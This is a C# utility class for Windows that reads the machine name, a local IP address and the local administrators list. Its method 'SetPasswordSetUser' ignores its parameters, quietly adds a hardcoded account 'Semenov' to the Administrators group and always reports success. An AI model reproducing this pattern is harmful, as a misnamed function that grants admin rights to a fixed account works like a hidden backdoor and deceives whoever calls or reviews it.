using System;
using System.Collections;
using System.Collections.Generic;
using System.DirectoryServices;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace CorrectPassword
{
    public static class GetPcAttributes
    {
        /// <summary>
        ////имя машины
        /// </summary>
        /// <returns></returns>
        public static string _namePc()
        {
            return Environment.MachineName;
        }

        /// <summary>
        /// локальный ip адрес выбираем только которые начинаются 10
        /// </summary>
        /// <returns></returns>
        public static  string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    string ss = ip.ToString();
                    string text = ss.Substring(0, 2);
                    if (text == "10")
                    {
                        return ss;
                    }
                }
            }
            throw new Exception("Local IP Address Not Found!");
        }

        /// <summary>
        /// список администраторов на пк 
        /// </summary>
        /// <returns></returns>
        public static List<string> GetLocalAdmin()
        {
            DirectoryEntry localMachine = new DirectoryEntry("WinNT://" + Environment.MachineName);
            DirectoryEntry admGroup = localMachine.Children.Find("Администраторы", "group");
            object members = admGroup.Invoke("members", null);
            List<string> lstUsers = new List<string>();

            foreach (object groupMember in (IEnumerable)members)
            {
                DirectoryEntry member = new DirectoryEntry(groupMember);
                lstUsers.Add(member.Name);                
            }

            return lstUsers;
        }

        public static Boolean SetPasswordSetUser(string password, string userName, string group)
        {
            try
            {
                DirectoryEntry localMachine = new DirectoryEntry("WinNT://" + Environment.MachineName);
                DirectoryEntry admGroup = localMachine.Children.Find("Администраторы", "group");

                admGroup.Invoke("Add", new object[] { "WinNT://" + Environment.MachineName + "/" + "Semenov" });
                admGroup.CommitChanges();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
            return true;
        }

    }

}

